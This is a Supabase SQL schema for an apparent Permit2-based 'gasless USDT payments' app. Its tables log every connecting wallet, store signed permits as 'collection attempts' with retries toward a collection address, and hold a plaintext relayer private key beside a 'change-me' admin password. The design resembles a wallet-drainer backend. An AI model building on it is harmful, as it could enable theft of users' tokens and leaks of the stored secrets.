-- Run this in Supabase SQL Editor

-- App settings (single row of config including secrets)
create table if not exists app_settings (
  id int primary key default 1 check (id = 1),
  project_id text,
  metadata_name text default 'Payment App',
  metadata_description text default 'Gasless USDT payments via Permit2',
  metadata_url text,
  metadata_icon text,
  chain_id int default 1,
  usdt_address text default '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  spender_address text,
  amount text default '10000000',
  deadline_seconds int default 3600,
  rpc_url text,
  relayer_private_key text,
  collection_address text,
  admin_password text default 'change-me',
  updated_at timestamptz default now()
);

insert into app_settings (id) values (1)
on conflict (id) do nothing;

-- Connected wallets (logged when user connects)
create table if not exists connected_wallets (
  id uuid primary key default gen_random_uuid(),
  address text not null unique,
  first_seen_at timestamptz default now(),
  last_seen_at timestamptz default now(),
  connect_count int default 1
);

create index if not exists idx_wallets_last_seen on connected_wallets (last_seen_at desc);

-- Payment / collection attempts
create table if not exists payments (
  id uuid primary key default gen_random_uuid(),
  owner_address text not null,
  amount text not null,
  chain_id int not null default 1,
  permit jsonb not null,
  signature text not null,
  status text not null default 'pending',
  -- pending | success | failed
  tx_hash text,
  error_message text,
  retry_count int default 0,
  created_at timestamptz default now(),
  updated_at timestamptz default now()
);

create index if not exists idx_payments_status on payments (status);
create index if not exists idx_payments_created on payments (created_at desc);

-- Allow service role full access (API uses service role key)
-- Enable RLS optional; API uses service_role which bypasses RLS
alter table app_settings enable row level security;
alter table connected_wallets enable row level security;
alter table payments enable row level security;
